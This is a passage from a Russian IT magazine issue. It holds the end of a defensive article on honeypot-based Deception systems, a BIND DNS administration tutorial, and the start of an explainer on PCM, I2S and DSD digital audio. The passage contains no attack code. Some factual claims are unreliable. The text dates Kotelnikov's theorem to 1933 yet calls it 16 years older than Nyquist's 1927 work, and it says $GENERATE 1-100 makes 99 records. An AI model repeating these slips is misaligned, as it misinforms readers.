вать сетевое взаимодействие. Взаимодействовать могут любые точки в рам‐
ках системы: ловушки с ловушками, агенты с ловушками. Реализация зависит
от конкретного решения и может включать как взаимодействие простыми
пакетами TCP/UDP, так и передачу данных по какому‐то высокоуровневому
протоколу.
   Конкретика будет зависеть от типа ловушки. К примеру, можно научить
агента с некой периодичностью ходить в ловуш ку, которая эмулиру ет SSH,
проходить на ней авториза цию и даже выполнять какие‐нибудь команды.





Важная деталь: выше я говорил, что ловушка оповещает о любых попытках
подклю читься к ней и переда ет уведомление об этом на сервер. И о подклю‐
чениях в рамках эмуляции тоже! В сервер Deception должен быть встроен
механизм, который сумеет отличить нас тоящие события безопасности.
  Эмуляция, кстати, в какой‐то мере пересекает ся с идеей приманок. Есть
сетевые протоколы, которые подразумевают передачу авторизационных дан‐
ных в открытом виде (например, FTP). Эму ляция подключения по FTP будет
работать так же, как и приманка: мы скармливаем атакующему, который прос‐
лушивает трафик, логин и пароль для доступа к ловушке.
  Использовать эту функциональность следует с осторожностью. Хакер
может заподозрить что‐то неладное, анализируя трафик: например, что все
запросы одинаковые, про исходят слишком час то, имеют нетипичную длину
или другие параметры. При разработке и при нас тройке сис тем Deception
требуется учитывать эти нюансы: вводить рандомиза цию или другие способы
маскировки.


ДОПОЛНИТЕЛЬНЫЕ КОМПОНЕНТЫ
Как я уже говорил, в Deception могут быть включены самые разные эле менты.
Я подробно остановлюсь на двух наиболее актуальных — автоматическом
развертывании и сбо ре данных с рабочих станций.


Автоматическое развертывание
Одна из потенциальных проблем Deception — это трудоемкость первичной
настройки. Без автоматичес кого деплоя при уста новке Deception в сеть
пришлось бы вручную определять список ловушек и эмулируемых сервисов,
правильно их настраивать и для каждой ловуш ки соз давать и раз мещать при‐
манки. Огромная работа!
  При этом нельзя взять и сделать типовое решение, чтобы ставить его каж‐
дому клиенту. В каждой орга низации свой набор сетевых ресурсов, которые
имеет смысл размещать в виде ловушек. Если сеть компании небольшая, то
справится один специалист, но что, если Deception ставит себе большая ком‐
пания? У нее может быть множес тво подсетей, которые нуждаются в установ‐
ке ловушек. В каждой подсети может быть свой набор типичных ресурсов. Так
что мысль автоматизировать раз вертывание напрашивается сама собой.
  Реализаций можно придумать несколько. К примеру, если Deception
интегрирован с системой ана лиза тра фика (как в примере с ложными поль‐
зователями), система сможет получать данные о том, по каким протоколам
идет взаимодействие в каждой отдельной подсети. На основе этой информа‐
ции Deception может автоматически устанавливать нужные виды ловушек
в нужном количестве и даже сама обновлять ложный слой сети при добав‐
лении новых реальных ресурсов.
   Если же такой интеграции нет, проблему мож но решить иначе. Сервер De‐
ception выполняет активное сканирование сети, получая данные об откры тых
портах на реальных машинах, или пас сивное прослушивание трафика там,
где это возможно. Собранную информацию Deception будет использовать
для автоматической уста новки ловушек.
   Третий способ еще проще, но не избавляет полностью от необходимости
ручной работы. Можно предос тавить оператору не ручное создание и нас‐
тройку отдельных ловушек, а спо соб выбора предпочти тельного списка
сетевых сервисов и предполага емого количес тва ловушек. Тогда установка
и настройка будет выполнена авто матичес ки по шаблону.


Сбор данных с рабочих станций
Deception может быть не только средством обна ружения атак. Наличие аген‐
тов позволяет системе брать на себя и другие задачи. Одна из них — сбор
агентом данных об установленном на компь ютерах ПО, включая версию
и дату установки. Резуль таты можно сравнивать с базами CVE и вовремя пре‐
дупреждать о том, что в используемой вер сии программы есть серьезная
уязвимость.





С другой стороны, агент может собирать данные для форензики (рассле‐
дования  инцидентов).  Когда  ловушка  обна руживает  атаку,  источник
которой — рабочая станция с агентом, Deception может сопоставить данные
от ловушки (время, порт источника соединения) с информацией, которой
обладает агент. Таким образом можно получить полезные све дения об атаке:
какой процесс ее запустил, как он проник на компь ютер и так далее.
   Также  агент  может  собирать  раз ные  индикаторы  компрометации
на рабочей стан ции сотрудника. Это позволило бы получать уведомления
даже до того, как атакующий перейдет к активным действиям в сети.


ЗАКЛЮЧЕНИЕ
Deception сравнительно новая технология, и решения этого класса появились
на рынке не так давно, одна ко она пос тепенно завоевывает популярность.
Deception не заменяет стандартные общепри нятые системы информацион‐
ной безопасности, но дополняет системы защиты, позволяя обнаружить ата‐
ки, обошедшие все прочие средс тва.
  Однако это очень гиб кая система, и бла года ря интеграции с другими
средствами ИБ она обес печивает широкие воз можности обнаруже ния атак.
В Deception можно встроить раз ные механизмы инвентаризации сетевых
активов, реагирование на инциденты и про чее. Эффективность этой системы
зависит от того, как ее разработать и настро ить. Если все сделать правильно,
злоумышленник не догада ется, что перед ним ненас тоящая цель. А даже если
сможет — для него будет уже поз дно.
   Deception простит какие‐то ошибки в нас трой ке: даже при наличии кос‐
венных признаков, по которым атакующий смо жет отличить ловушку, система
остается достаточно эффективной. Но забывать о правильной настройке
не стоит!
   Если ты сомневаешься, нуж на ли тво ей компании такая технология,
можешь установить пробную версию любого из решений (в том чис ле наше!).
Если же ты выступаешь на стороне пентестеров и редтимеров, то надеюсь, ты
оценил наши усилия в усложнении тво ей жизни! :)
АДМИН
   ХИТРОСТИ
  BIND

                  БЕРЕМ КОНТРОЛЬ
                         НАД DNS
                     В СВОИ РУКИ





                                                                        Даниил Батурин
                                                                                 Координатор проекта VyOS
                                                                                                           (https://vyos.io), «языковед»,
                                                                                   функциональщик, иногда
                                                                                      сетевой администратор
                                                                                                       daniil@baturin.org





BIND был и остается одной из самых популярных реали заций
сервера DNS. Долгое время он был фак тическим стан‐
дартом и для ответственных (authoritative), и для кэширующих
серверов. Более того, до двухтысячных годов все до еди ного
корневые сервера работали имен но на нем. В этой статье
мы рассмотрим ряд не слишком известных, но полезных воз‐
можностей BIND.


То десятилетие с середины девяностых по середи ну двухтысячных вообще
было временем фактических монополий. Веб‐сервер — Apache HTTPD, поч‐
товый сервер — Sendmail, ну а сервер DNS — BIND. С тех пор появилось
множество альтернатив. Нап ример,  часть корневых серверов перешли
на NSD.
  Однако альтернативы старым проектам часто идут по пути специализации.
NSD не кэширует запросы и предназначен только для держателей доменов —
он идеально подходит для корневых серверов, но совершенно не подойдет
для корпоративного или про вайдерского сервера. Проект PowerDNS состоит
из двух независимых частей: ответственный pdns и кэширующий pdns_recur‐
sor. Проект dnsmasq — чисто кэширующий сервер для малых сетей со встро‐
енной реализацией DHCP.
  В то же время BIND универ сален. Возможно, это и позволяет ему оста‐
ваться популярным. Он может и отвечать за зоны, и кэшировать запросы,
и хранить записи в реляционных БД. Это, может, и не лучший проект для каж‐
дой из задач в отдельнос ти, но зато он реша ет их все одновременно с весьма
неплохой производительностью. Таким спо собом не слишком большие ком‐
пании и сети учебных и испытательных лабораторий впол не могут обойтись
одним сервером DNS.


ПРОВЕРЯЕМ СИНТАКСИС НАСТРОЕК
При работе с серверами вручную многие люди правят файл настроек,
перезапускают сервис и бегут чинить, если он не запус тился. И совершенно
зря, потому что у многих проектов есть опции демона или отдельные утилиты
для проверки синтаксиса! В их числе и BIND.
   Утилиты named‐checkconf и named‐checkzone весьма полезны как при
ручной настройке, так и при написа нии скриптов. Будем честны ми — грам‐
матика файлов BIND не всег да интуитивна. С помощью этих утилит можно
получить более‐менее внят ные сооб щения об ошиб ках без перезапус ка сер‐
виса.


$ named‐checkconf /tmp/new‐named.conf || echo "Bad file"
/etc/named.conf:66: missing ';' before '}'
Bad file


$ named‐checkzone example.com /var/named/data/example.com
zone example.com/IN: NS 'ns1.example.com' has no address records (A
or AAAA)
zone example.com/IN: not loaded due to errors.


УСКОРЯЕМ ЗАГРУЗКУ ЗОН
Текстовый формат зон BIND стал фактическим стандартом, и его поддержи‐
вают многие другие реализации, прежде всего чтобы упростить перенос
существующих зон. Некоторые регистраторы даже позволяют редактировать
и вносить записи в этом формате через веб‐интерфейс. Формат www IN A
192.0.2.1 видели даже далекие от DNS люди.


             INFO

                    Ключевое слово IN — это не предлог in, а сок‐
                     ращение от Internet. Протокол DNS и BIND появи‐
                       лись до того, как исследовательские сети объ‐
                      единились в единый Интернет, поэтому в DNS
                      до  сих  пор  формально  существуют  классы
                       записей IN (Internet) и CH (ChaosNet).


Однако этот формат не слишком прост для син таксичес кого разбора — и заг‐
рузка зон с большим числом записей может ощу тимо замедлить запуск
демона. Регистраторы доменов и хостеры нередко хранят записи в базе дан‐
ных, что и быстрее, и про ще в управлении из админки.
  Но если проблема толь ко в производительности, есть и более простой
способ: использовать двоичные форматы фай лов.
   Конвертировать зону в двоичный формат можно командой named‐com‐
pilezone. Формата два: map и raw. Формат map представляет собой прос той
дамп памяти. Он загружается быстрее всего, поскольку вообще не требует
разбора, но не является переносимым — работа ет только в пре делах одной
архитектуры. Формат raw загружа ется чуть медленнее, но работает на любой
машине.
   Рассмотрим пример для формата map. Сна чала нужно скомпилировать
в него текстовый файл зоны.


$ sudo named‐compilezone ‐Fmap ‐o /var/named/data/example.com.map
example.com /var/named/data/example.com

Затем нужно соответствующим образом поправить описание зоны в /etc/
named.conf. Формат файла с данными зоны не определяется автоматически,
поэтому нам придется указать опцию masterfile‐format.


zone "example.com" {
    type master;
    masterfile‐format map;
    file "/var/named/data/example.com.map";
};

Ощутимая разница замет на только на очень боль ших файлах. Но если ты ока‐
жешься в такой ситуации, теперь ты зна ешь, как из нее выйти.


ГЕНЕРИРУЕМ ЗАПИСИ ДЛЯ ДИАПАЗОНОВ АДРЕСОВ
Часто в ответах на обратные запросы можно увидеть адреса вроде 192.0.2.
10.customers.example.com. Такие записи удоб ны для админов других
сетей — из вывода traceroute или tcpdump сра зу понятно, какой компании
принадлежит адрес.
   Как они делаются? Мож но сгенерировать их скриптом и записать в файл
зоны, но в BIND для этой цели есть встроенный механизм — директива $GEN‐
ERATE.
  Для  примера  сгенерируем  записи  вида  192.0.2.X.users.example.com
для диапазона адресов 192.0.2.1–100.
  Сначала добавим обратную зону для сети 192.0.2.0/24 в /etc/named.
conf.


zone "2.0.192.in‐addr.arpa" {
        type master ;
        file "/var/named/data/2.0.192.in‐addr.arpa" ;
};

Затем создадим файл зоны.


$TTL 86400


@ IN SOA localhost. root .localhost. (
        2020071001 ; serial
        28800 ; refresh
        14400 ; retry
        3600000 ; expire
        86400 ; default TTL
)


2 .0 .192 .in‐addr .arpa .   IN  NS  ns1 .example.com .


200 IN PTR jrandomhacker .users .example.com .


$GENERATE 1 ‐100 $ PTR 192 .0 .2 .$.users .example.com .

Применим изменения командой rndc reload или перезапуском сервиса.
Для начала убе димся, что зона работает, и зап росим PTR к настроенному
вручную 192.0.2.200.


$ host 192.0.2.200 localhost
200.2.0.192.in‐addr.arpa domain name pointer jrandomhacker.users.ex‐
ample.com.

Теперь проверим адрес, для которого нет явной записи.


$ host 192.0.2.76 localhost
76.2.0.192.in‐addr.arpa domain name pointer 192.0.2.76.users.exam‐
ple.com.

Как видим, все работает как ожидалось.
   Разберем директиву на части. Первый аргумент (1‐100) — это диапазон
значений счетчика. Символ $ при генера ции записей заменяется на текущее
значение счетчика. В нашем случае BIND сгенерирует 99 правил от $=1
до $=100.
   Второй аргу мент — имя записи. Для записей типа PTR это номер хоста
в сети, и он сов падает со счетчиком, потому и прос то $. Третий аргумент —
тип записи. Наконец, пос ледний аргумент — ее зна чение.
   Увы, в BIND нет способа исклю чить из автомати ческой генерации адреса,
для которых уже есть явные записи, так что для клиентов со статическими
адресами нужно либо выделить отдельный диапа зон, либо смириться с двумя
записями для одного адреса — явной и автоматически сгенерированной
(что, впрочем, не принесет никакого вреда).
  Директива $GENERATE обрабатывается при загрузке зоны и генерирует
все записи в памяти. Таким образом, с ее помощью можно сэкономить время
админа и число строк в файле зоны, но требова ния к памяти останутся теми
же.
   Автоматически   сгенерированные   записи  обычно   ассоциируются
с обратными зонами, но не огра ничиваются ими.
  Предположим, у тебя есть пять веб‐серверов с адресами 203.0.113.10–
15. Ты хочешь  создать  для  них  записи  вида www[1‐5].example.com.
Это вполне можно сделать автоматически. Добавь вот такую запись в файл
зоны example.com:


$GENERATE 1‐5 www$ A 203.0.113.${10,0,d}

Здесь 10 это константа, которая добавляется к значению счетчика, 0 — число
ведущих нулей в значении (мы генерируем IP‐адрес и дополнение нулями
нам не нужно), d — десятичный формат вывода.


SPLIT DNS
Представь  себе  следующую  рас пространенную  ситуацию.  Есть  сеть,
положим 10.0.0.0/24, в ней — веб‐сервер 10.0.0.100 и рабочая стан‐
ция 10.0.0.200. Есть маршру тизатор с внешним адресом 203.0.113.1. Пор‐
ты 80/443 проброшены внутрь на 10.0.0.100.
   Если создать запись вроде www.example.com. IN A 203.0.113.1, то
запросы  из внешних  сетей  на  https://www.example.com  будут  отлично
работать. Увы, без дополнитель ных мероприятий не будут работать запросы
на этот адрес из внутренней сети.
   Чаще все го эту проб лему решают с помощью так называемого hairpin NAT.
Об этом я уже когда‐то писал. Решение с hairpin — приемлемое, но не иде‐
альное. Трафик с этом слу чае идет через маршру тиза тор, даже если оба хос‐
та находятся в одном сегменте канального уровня и могли бы общаться нап‐
рямую.
  Популярность решения с hairpin объяснима. Многие сети вообще не име‐
ют своих серверов DNS, в этом случае других решений и нет. Даже если свои
сервера есть, правило для hairpin сетевой админис тратор может настроить
без взаимодействия с администратором сервера DNS. Тем не менее пра‐
вильное решение этой задачи — использовать split DNS, то есть выдавать
разный ответ в зависимости от того, кто спра шива ет.
   Рассмотрим пример настройки. Для простоты тестирования в пределах
одной машины мы используем адрес 127.0.0.10 в качес тве условной «внут‐
ренней сети» — под localhost отведена вся сеть 127.0.0.0/8, а не только
общеизвестный 127.0.0.1.
   Чтобы выдавать разные ответы, нуж но создать нес колько «пред ставлений»
(view) в /etc/named.conf. У каждого view должна быть прописана опция
match‐clients, которая принимает либо имя ACL, либо ключевое слово any.
  Важный момент: если ты используешь split DNS, то все зоны нужно помес‐
тить в какое‐то представление, даже если они используются только в одном
представ лении. Иначе демон отка жется загружать нас тройки.


acl internal ‐network {
   127 .0 .0 .10/32;
};


view "internal" {
        match ‐clients { internal ‐network; };


        zone "example.com" {
                type master ;
                file "/var/named/data/example.com‐internal" ;
        };
};


view "external" {
        match ‐clients { any ; };


        zone "example.com" {
                type master ;
                file "/var/named/data/example.com" ;
        };
};

Для тестирования воспользуемся утилитой dig, опять же из пакета BIND. Она
позволяет  указать адрес источника опци ей ‐b. Убедимся,  что записи
для www.example.com в файлах example.com и example.com‐internal раз‐
ные, и выполним запросы сначала с 127.0.0.1, затем с 127.0.0.10.



  $ cat /var/named/data/example.com | grep www
  www IN  A   203.0.113.1


  $ cat /var/named/data/example.com‐internal | grep www
  www IN  A   10.0.0.100


  $ dig @127.0.0.1 www.example.com a
  ;; ANSWER SECTION:
  www.example.com.    86400   IN  A   203.0.113.1


  $ dig ‐b127.0.0.10 @127.0.0.1 www.example.com a
  ;; ANSWER SECTION:
  www.example.com.    86400   IN  A   10.0.0.100


Как видим, во втором случае нам выдали в ответ внутренний адрес, что нам
и нужно.


ЗАКЛЮЧЕНИЕ
Кто‐то скажет, что свой сервер DNS больше не нужен и все можно сделать
через админку регистра тора. Но если у тебя сколько‐нибудь сложная внут‐
ренняя сеть, это совершенно не так. Свой сервер может сделать сеть более
удобной и управляемой, и BIND поможет тебе в этом.
GEEK
 НЕ ПУСТОЙ
     ЗВУК





РАЗБИРАЕМСЯ, КАК УСТРОЕНО
                                                                            Mak2k2ЦИФРОВОЕ КОДИРОВАНИЕ ЗВУКА        mak2k2@ya.ru





Задумывался ли ты, как в цифровых устройствах воспро‐
изводится звук? Как формируется звуковой сигнал из ком‐
бинации единиц и нулей? Наверняка задумывался, раз уже
начал читать! Но часто даже у про фессионалов есть лишь
общее представ ление о современ ном  звуковом тракте.
Из этой статьи ты узнаешь, как появились разные форматы,
что такое цифроана логовый преобразователь, какие виды
ЦАП бывают и от чего зависит качество воспроизведения
звука.


PCM (ИКМ)
Как известно, в цифровом звуке практичес ки любой формат, за редким
исключением,  записывается  импульсно‐кодовым  потоком,  или  потоком
PCM — pulse code modulation. FLAC, MP3, WAV, Audio CD, DVD‐Audio и дру гие
форматы — это лишь способы упаковки, «консервации» потока PCM.


С чего все начиналось
Теоретические основы цифровой переда чи звука были раз работаны еще на
заре двадцатого века, когда ученые попытались передать звуковой сигнал
на большое расстояние, но не по телефону, а довольно странным для того
времени способом.
   Разделив звуковую волну на небольшие час ти, ее можно было отправлять
получателю в некоем математическом представлении. Получатель, в свою
очередь, мог восстановить исходную вол ну и прослушать запись. Также
перед учеными стояла задача увеличить про пус кную способ ность «эфира».
  В 1933 году увидела свет теорема В. А. Котельникова. В западных
источниках ее называют теоремой Найквиста — Шеннона. Да, Гарри Най‐
квист был первым, кто затронул эту тему: в 1927 году он рас считал минималь‐
ную частоту дискретизации для передачи формы вол ны, впоследс твии наз‐
ванную в его честь «частотой Найквиста», — но теорема Котельникова была
издана на 16 лет раньше.
   Суть теоремы проста: непрерывный сигнал можно представить в виде
интерполяционного ряда, сос тоящего из дискретных отче тов, по которым
можно заново восстановить сигнал. Чтобы была возможность восстановить
приблизительно исходное состояние сигнала, частота дискретизации дол жна
равняться как минимум удвоенной верхней граничной частоте этого сигнала.





Много лет теорема не была востребова на — вплоть до прихода цифровой
эпохи. Тут‐то ей и нашлось применение. В час тности, теорема при годилась
при разработке формата CDDA (Compact Disc Digital Audio), в прос тонародье
его называют Audio CD или Red Book. Формат был выпущен инженерами
Philips и Sony в 1980 году и стал стандартом для аудио‐компакт‐дисков.
   Характеристики формата:
 • частота дискре тизации — 44,1 кГц;
 • разрядность квантования — 16 бит.


             INFO

                  •Частота дискретизации — количество отсчетов
                          сигнала,  «взятых»  при  его  дискретизации.
                      Измеряется в герцах.
                  •Разрядность квантования — количество дво‐
                        ичных разрядов, выражающих амплитуду сиг‐
                           нала. Измеряется в битах.


Частота дискретизации 44,1 кГц была рас считана из теоремы Котельникова.
Считается, что слух среднеста тистичес кого человека не способен уловить
звук за пре делами 19–22 кГц. Вероятно, час тота 22 кГц и была выбрана
в качестве верхней граничной.



      22 000 Ч 2 = 44 000 + 100 = 44 100 Герц

Откуда взялось 100 Герц? Есть вер сия, что это небольшой запас на случай
ошибок или передискретизации. На самом деле такую частоту в Sony выб‐
рали из соображений совместимос ти со стандартом телевещания PAL.
   Разрядность формата CDDA — 16 бит, или 65 536 отсче тов, что равняется
динамическому диапазону примерно в 96 дБ. Такое большое число отсчетов
выбрано не случайно. Во‐первых, из‐за сильного влияния шумов кван‐
тования, во‐вторых, чтобы обеспечить формаль ный динамичес кий диапазон
выше, чем у главных тогда конкурентов — кассетных записей и виниловых
пластинок. Я расскажу об этом подробнее в раз деле про цифроаналоговые
преобразователи.
   Дальнейшее развитие PCM так и продолжилось по принципу умножения
на два. Появились другие час тоты дискретиза ции: сначала добавилась час‐
тота дискретизации 48 кГц, а в дальнейшем основанные на ней частоты 96,
192 и 384 кГц. Частота 44,1 кГц также удва ива лась до 88,2, 176,4 и 352,8 кГц.
Разрядность же увеличилась с 16 до 24, а позднее и до 32 бит.
  Следующим после CDDA в 1987 году появился формат DAT — Digital Audio
Tape. Частота дискретиза ции в нем сос тавила 48 кГц, раз рядность кван‐
тования не изменилась. И хотя формат провалился, час тота дискретиза‐
ции 48 кГц прижилась на студиях зву коза писи, как пишут, из‐за удобства циф‐
ровой обработки.
  В 1999 году вышел фор мат DVD‐Audio, который позволял записать на один
диск шесть  сте реодорожек с  частотой дис кретизации 96  кГц и  раз‐
рядностью 24 бит или две стереодорож ки с частотой 192 кГц, 24 бит.
  В том же году был представлен формат SACD — Super Audio CD, но дис ки
для него стали производить только спус тя три года. Подробнее об этом фор‐
мате я расскажу в разделе про DSD.
   Это основные фор маты, которые считаются стандартом для цифровых зву‐
козаписей на носите лях. Теперь рас смот рим, как передаются данные в циф‐
ровом звуковом тракте.


СТРУКТУРА ЦИФРОВОГО ЗВУКОВОГО ТРАКТА
При  проигрывании  музыки  происходит  примерно  следующее:  плеер
при помощи кодека, выполненно го в виде устройства или программы, рас‐
паковывает файл в заданном формате (FLAC, MP3 и другие) или считывает
данные с CD, DVD‐Audio или SACD‐диска, получая стандартный поток данных
PCM. Затем этот поток передается через USB, LAN, S/PDIF, PCI и так далее
в I2S‐конвертер. В свою очередь, конвертер преобразует полученные данные
в так называемые кадры интерфейса передачи данных I2S (не путать с I2С!).





I2S
I2S — это последовательная шина передачи цифрового аудиопотока. Сейчас
I2S — стандарт для подключения источни ка сигнала (компьютер, проигры‐
ватель) к цифроаналоговому преобразова телю. Именно через нее подклю‐
чается напрямую или опос редованно подавляющее большинство ЦАП.
Существуют и другие стандарты переда чи цифрового аудиопотока, но они
используются гораздо реже.





               Выход (вход) I2S на печатных платах

Шина I2S может состоять из трех, четырех и даже пяти контактов:
 • continuous serial clock (SCK) — тактовый сигнал битовой син хрониза‐
   ции (может называться BCK или BCLK);
 • word select (WS) — тактовый сигнал кадровой синхронизации (может
   называться LRCK или FSYNC);
 • serial data (SD) — сигнал передаваемых данных (может называться
   DATA, SDOUT или SDATA). Как пра вило, данные передаются от передатчика
   к приемнику, но бывают устройства, которые могут выс тупать и приемни‐
   ком, и передатчиком одновременно. В таком слу чае может присутс твовать
  еще один контакт;
 • serial data in (SDIN) — по этому контакту данные движутся в направле‐
   нии приема, а не передачи.

SD или SDOUT служит для подключения цифроана логового преобразователя,
а SDIN используется для подключения аналого‐цифрового пре образователя
к шине I2S.
  В большинстве случаев присутс твует еще один контакт, Master Clock
(MCLK или MCK), он используется для син хрониза ции приемника и передат‐
чика от одного генератора тактовых импульсов, чтобы снизить коэффициент
ошибок передачи данных. Для внешней син хронизации MCLK служат два
генератора тактовых импульсов: с частотой 22 579 кГц и 24 576 кГц. Первый,
22 579 кГц, — для частот, кратных 44,1 кГц (88,2, 176,4, 352,8 кГц), а второй,
24 576 кГц, — для частот, кратных 48 кГц (96, 192, 384 кГц). Также могут
встречаться генераторы на 45 158,4 кГц и 49 152 кГц — наверняка ты уже
заметил, как в мире циф рового зву ка всё любят умножать на два.





                          Frame, или кадр I2S

В I2S обязательно исполь зуются три контакта: SCK, WS, SD — остальные кон‐
такты опциональны.
  По каналу SCK передаются синхро импульсы, под которые синхронизи‐
рованы кадры.
  По  каналу WS передается длина  «слова», при этом  используются
и логические состояния. Если на контакте WS логическая единица, значит,
передаются дан ные правого канала, если ноль — данные левого канала.
  По SD передаются биты данных — зна чения амплитуды звукового сигнала
при квантовании, те самые 16, 24 или 32 бита. Никаких контрольных сумм
и  служебных  каналов  на шине  I2S  не  предус мотрено.  Если  данные
при передаче потеряются, возможности восстановить их не сущес твует.
  На дорогих ЦАП часто бывают внешние разъемы для под ключения к I2S.
Использование таких разъемов и кабелей может пло хо отразиться на звуке,
вплоть до появления «артефактов» и заиканий, все будет зависеть от качес‐
тва и длины провода. Все же I2S это внутрисхемный разъем, и длина провод‐
ников от передатчика до приемника должна стремить ся к нулю.
   Рассмотрим, как переда ется поток данных PCM по шине I2S. Например,
при передаче PCM 44,1 кГц с раз рядностью 16 бит длина слова на канале SD
будет соответствовать этим шестнадцати битам, а длина кадра будет 32 бита
(правый канал + левый). Но чаще всего переда ющие устройства используют
длину слова 24 бита.





При воспроизведении PCM 44,1 × 16 старшие биты либо попросту игнориру‐
ются, так как запол нены нулями, либо, в случае со старыми мультибитными
ЦАП, они могут перейти на следующий кадр. Длина «слова» (WS) может также
зависеть от плеера, через который вос производится музыка, а также от драй‐
вера устройства воспроизведения.
   Альтернативой PCM и I2S может быть запись зву кового сигнала в DSD.
Этот формат развивался параллельно с PCM, хотя и тут теоре ма Котель‐
никова  оказала  некоторое  влияние. Для  улучшения  качества  звучания
по сравнению с CDDA упор был сделан не на повышение раз рядности кван‐
тования, как в формате DVD Audio, а на увеличение частоты дискретизации.


DSD
DSD расшифро вывается как Direct Stream  Digital. Он берет свое начало
в лабораториях фирм Sony и Philips — впрочем, как и другие форматы, рас‐
сматриваемые в этой статье.


SACD
Впервые DSD увидел свет на дисках Super Audio CD в далеком 2002 году.





На тот момент SACD казался шедевром инженерной мысли, в нем был при‐
менен совершенно новый способ записи и воспро изведения, очень близкий
к аналоговым устрой ствам. Реализация одновременно была простой и изящ‐
ной.
  Носитель даже оснастили защитой от копиро вания, хотя и без этого
никакие пираты были не страшны. Под марками Sony и Philips стали выпус кать
«закрытые» устрой ства исключительно для вос произведения, без какой‐либо
возможности копировать диски. Производители про давали сту диям оборудо‐
вание для записи, но при этом оставили за собой контроль за выпуском
SACD‐дисков.
   Как знать, возможно, формат SACD мог бы обрести популярность, срав‐
нимую с Audio CD, если бы не сто имость устройств воспроизведения. Безос‐
новательно накручивая цены на проигрыватели, руководители Sony и Philips
сами мешали популярности сво его формата. А следующая ошибка и вовсе
поставила крест на про дажах специализированных устройств. Для прод‐
вижения игровой приставки Sony PlayStation инженеры Sony добавили воз‐
можность слушать на ней SACD. Хакеры тут же взломали приставку и стали
копировать диски SACD в ISO‐обра зы, которые можно записать на обычную
бол ванку DVD и воспроизводить на любом плеере фирм‐конкурентов; другие
просто извле кали дорожки для вос произведения на компьюте ре.
   Звукозаписывающие компании тоже хороши: вопреки ожиданиям мелома‐
нов, они не пользовались всеми воз можнос тями нового формата высокого
разрешения. На студиях не записывали в DSD музыку с мастер‐ленты, а бра‐
ли цифровую запись в PCM, перес водили и обра баты вали всем подряд:
лимитерами, компрессорами, дитерингом с нойз‐шейпингом и различны ми
цифровыми фильтрами. В ито ге на выходе получался такой стерильный
и сухой звук, что даже CD Audio мог бы звучать гораз до лучше. Таким образом
было подорвано доверие слушателей к SACD, а заодно и к новым форматам
вообще.


             INFO

                        Увы, с виниловыми пластинками эта порочная
                       практика применяется и по сей день: студии
                        печатают винил с цифровой записи, даже если
                         у них  есть запись на мастер‐ленте.  Так  что
                       на современном виниле зап росто может оказать‐
                        ся 44,1 × 16.



DSD
Что же представляет собой DSD? Это однобитный поток с очень высокой,
по сравнению с PCM, частотой дискретизации. Также в DSD используется
иной вид модуляции, PDM (Pulse Density Modulation) — плотнос тно‐импуль‐
сная модуляция. Запись звука в таком формате производится однобитным
аналого‐цифровым преобразова телем, сей час такие АЦП на основе сиг‐
ма‐дельта‐модуляции используются повсеместно. Процесс записи выглядит
примерно так: пока амплитуда волны возрастает, на выходе АЦП логическая
единица, когда амплитуда падает, на выходе логический ноль, среднего зна‐
чения быть не может. Сравнивается с предыдущим значением амплитуды
волны.





DSD позволяет достичь важных преиму ществ по сравнению с PCM:
 • точнее прорисовка вол ны;
 • выше помехоустой чивость;
 • более простой способ коммутации и передачи цифрового потока;
 • теоретически есть возможность умень шить стоимость, упростив схему
   ЦАП, но из‐за обратной совместимос ти со ста рыми форматами произво‐
   дители вряд ли пой дут на это.

Изначально на SACD‐дисках использовал ся формат DSD x64 c частотой дис‐
кретизации 2822,4 кГц. За осно ву взя ли час тоту дискре тизации Audio CD
44,1 кГц, увеличенную в 64 раза, отсю да наз вание x64. Сегодня реально
используются следующие DSD:
 • x64 = 2822,4 кГц;
 • x128 = 5644,8 кГц;
 • x256 = 11 289,6 кГц;
 • x512 = 22 579,2 кГц;
 • заявлен DSD x1024.


DXD
Существует некий промежуточный формат меж ду PCM и DSD под названием
DXD — Digital eXtreme Deﬁnition. Это, по сути, PCM высокого разрешения —
352,8 кГц или 384 кГц с разрядностью квантования 24 или 32 бита. Он при‐
меняется в студиях для обработки и последующего све дения материалов.
  Но такой подход ущербен: во‐первых, он не поз воляет задействовать все
преимущества DSD, во‐вторых, размер фай лов получается больше, чем
в DSD. На текущий момент флагманские ЦАП на входе I2S принимают поток
данных PCM с частотой дискретизации до 768 кГц и разрядностью до 32 бит.
Страшно даже считать, какой объем на жестком дис ке будет занимать один
альбом в таком разрешении.


DSD практически отделился от SACD. Теперь формат DSD чаще можно встре‐
тить упакованным в файлы с рас ширением DSF и DFF. Выпущено множес тво
проигрывате лей с возможностью записи в DSF и DFF, любители хорошего
звука все чаще и чаще оцифровывают виниловые плас тинки именно в фор‐
мате DSD. А вот на звукоза писывающих студиях никто не хочет вкладываться
в  малопопулярные форматы,  так  что  там  про дол жают  клепать  звук
на минималках: 44,1 × 16.


Коммутация DSD и передача данных
Для передачи цифрового потока в DSD исполь зуется трехконтактная схема
подклю чения:
 1. DSD Clock Pin (DCLK) — син хронизация;
 2. DSD Lch Data Input Pin (DSDL) — данные левого канала;
 3. DSD Rch Data Input Pin (DSDR) — данные правого канала.





В отличие от I2S, переда ча данных DSD предельно упрощена. DCLK задает
тактовую частоту битовой синхрониза ции, а по контактам DSDL и DSDR пос‐
ледовательно передаются сами данные левого и правого канала соответс‐
твенно. Никаких ухищрений тут нет, запись и воспроизведение в DSD дела‐
ется побитно. Такой подход дает максимальное приб лижение к аналоговому
сигналу, а за счет высокой частоты умень шаются шумы квантования и на
порядок повышается точность вос произведения.


DOP
DoP часто применяется для передачи потока данных DSD, поэтому упомянуть
о нем стоит. DoP — это открытый стандарт переда чи данных DSD через кадры
PCM (DSD over PCM). Стандарт создан для того, чтобы передавать поток
через драйверы и устрой ства, не поддерживающие прямую передачу DSD (не
DSD native).
  Принцип работы такой: в 24‐битном кадре PCM старшие 8 бит запол няют‐
ся единицами — это значит, что в данный момент передаются данные DSD.
Оставшиеся 16 бит заполняют ся последова тельно битами данных DSD.





Для передачи DSD x64 с частотой одно битного потока 2822,4 кГц необ‐
ходима частота дискретизации PCM, равная 176,4 кГц  (176,4 × 16 =
2822,4 кГц). Для передачи DSD x128 с частотой 5644,8 кГц уже потребу ется
частота дискре тизации PCM 352,8 кГц.


             INFO

                     Подробности ты можешь найти в описании стан‐
                       дарта DoP (PDF).



ЦИФРОАНАЛОГОВЫЕ ПРЕОБРАЗОВАТЕЛИ
Перейдем к ЦАП — цифро‐ана логовым преобразователям. Эта сложная тема
всегда покрыта завесой тайны и присыпана аудиофильской мистикой. К тому
же вокруг цифроаналого вых преобра зователей очень много спе куляций про‐
